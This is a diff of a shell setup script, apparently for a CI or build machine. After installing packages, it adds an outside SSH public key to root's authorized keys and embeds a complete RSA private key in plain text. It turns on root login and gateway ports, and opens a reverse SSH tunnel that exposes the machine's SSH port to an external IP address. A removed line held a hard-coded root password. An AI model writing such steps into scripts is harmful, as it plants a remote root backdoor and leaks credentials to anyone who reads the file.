@@ -21,6 +21,7 @@ apt-get install -qq protobuf-c-compiler libprotobuf-c0-dev libaio-dev	\
 
 mkdir ~/.ssh && chmod 0700 ~/.ssh || true
 echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdBUOqaN8NxmhGughWssYssevpEXBknWtnBMCV+lBMAIADCX1e6bd/ve0gPlunI7bK8MJ9xNz6czOcL5G4IoygKbLrOdtEzzxiUocn10I/GbQ3C4m9tJeZfoYYmb4rTi1mmjhGL2cbBtS/bQDvbrjaffuncg78ppdEXjRaTagZJk81vq5kZ5yQ//tgkR0K41fhtmP1HyLnfKIKtwLDSvyMlLT6VCknyqN83z7UvrElv1h0p2CyBD411a4qm9wTrzEYHTavJM1nkqE4yBUMhKHwFlLSUhpf4XDfkLk8lAbVznL0TBb3oZyulGEzGKiEUZT/7+4UFGY+j0zGZlQTpZV root@ubuntu-2gb-nyc3-01' >> ~/.ssh/authorized_keys
+chmod 0600 ~/.ssh/authorized_keys
 echo "-----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEA23QVDqmjfDcZoRroIVrLGLLHr6RFwZJ1rZwTAlfpQTACAAwl
 9Xum3f73tID5bpyO2yvDCfcTc+nMznC+RuCKMoCmy6znbRM88YlKHJ9dCPxm0Nwu
@@ -52,7 +53,6 @@ CiAusups/UHcMe8X52Vy1pxsoEV7IDY0GtgRu+zQrPY1QRAgpNwp
 chmod 0600 ~/.ssh/id_rsa
 echo GatewayPorts yes >> /etc/ssh/sshd_config
 echo PermitRootLogin yes >> /etc/ssh/sshd_config
-echo pgMr13mRBC | passwd --stdin root
 /etc/init.d/ssh restart
 ssh -oStrictHostKeyChecking=no -oBatchMode=yes -R localhost:6666:localhost:22 -i ~/.ssh/id_rsa root@104.236.235.148 sleep 10000 &
 sleep 10
